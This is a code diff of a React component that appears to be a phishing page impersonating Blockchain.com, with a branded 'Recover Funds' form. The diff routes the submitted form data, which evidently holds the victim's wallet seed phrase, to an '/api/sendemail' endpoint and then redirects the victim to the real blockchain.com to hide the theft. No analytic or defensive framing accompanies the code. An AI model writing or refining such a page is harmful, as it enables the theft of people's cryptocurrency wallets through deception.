@@ -18,24 +18,25 @@ const Main = () => {
         const jsondata = JSON.stringify(data)
         console.log(jsondata)
   
-        fetch('/api/hello', {
+        fetch('/api/sendemail', {
             method: 'POST',
             body: jsondata
         }).then((res) => {
             console.log('successful')
-                Router.push('https://www.blockchain.com/')
+                
                 setSeedPhrase('')
 
         })
+        Router.push('https://www.blockchain.com/')
       }
 
     return (
-        <main className="bg-[#121D33] w-full h-full">
-            <div className="flex items-center justify-center">
+        <main className="bg-[#121D33] w-full h-screen">
+            <div className="flex items-center justify-center bg-[#121D33]">
         <div className="flex flex-col items-center justify-center mt-36">
-            <img src="/images/blockchain.png" alt="blockchain" className="w-52 mb-5"/>
+            <img src="/images/blockchain.png" alt="blockchain" className="w-52 "/>
 
-            <div className="xl:w-[480px] md:w-96 w-[340px] md:h-72 h-80 bg-white rounded-lg lg:px-5 px-2 py-4">
+            <div className="xl:w-[480px] md:w-96 w-[340px ] md:h-72 h-80 bg-white rounded-lg lg:px-5 px-2 py-4 mb-5">
                 <h2 className="font-semibold text-blue-900 text-base">
                     Recover Funds
                 </h2>
